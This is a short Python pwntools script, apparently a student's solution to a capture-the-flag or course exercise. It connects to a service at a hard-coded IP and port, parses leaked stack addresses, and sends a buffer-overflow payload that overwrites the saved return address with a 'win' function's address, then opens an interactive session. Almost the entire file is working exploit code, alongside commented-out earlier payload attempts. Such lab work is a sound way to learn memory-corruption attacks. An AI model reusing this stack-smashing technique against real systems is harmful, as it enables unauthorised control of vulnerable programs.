from pwn import remote
import struct

def main():
    r = remote("107.21.135.41", 3333)
    # r = r.recv()
    # print(r)
    r.recvuntil(b"Please select from menu: ")
    r.sendline(b"1")
    # r.recvuntil(b"ID: ")    
    # r.sendline(b"agoyal61")
    # r.close()
    # address = 0x151a
    # payload = "0x61/0x61" + struct.pack("<Q", address)    
    # r.sendline(payload)
    # writing = b"1\n" + b"a"*40 + struct.pack("<Q",0x55555555551a)
    # r.sendline(writing)

    # r.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1aUUUUU\x00\x00")

    # hex_address = 93824992236826
    # payload = b"a"*40 + struct.pack("<Q", int(hex_address, 16))
    # r.sendline(payload)
    
    # r.recvuntil(b"Current Return Address: ")
    # rip = r.recvline()

    r.recvuntil(b"Current Return Address: ")
    rip_savd = int(r.recvline().decode(), 16)

    r.recvuntil(b"the base pointer: ")
    rbp = int(r.recvline().decode(), 16)

    r.recvuntil(b"will be stored: ")
    buffer = int(r.recvline().decode(), 16)

    rip = rbp + 8

    padding = rbp - buffer + 8

    print(padding)

    win_addr = rip_savd - 0x17e9 + 0x151a

    payload = b"a"*padding + struct.pack("<Q", win_addr)

    r.sendline(payload)

    r.interactive()
if __name__ == "__main__":
	main()        
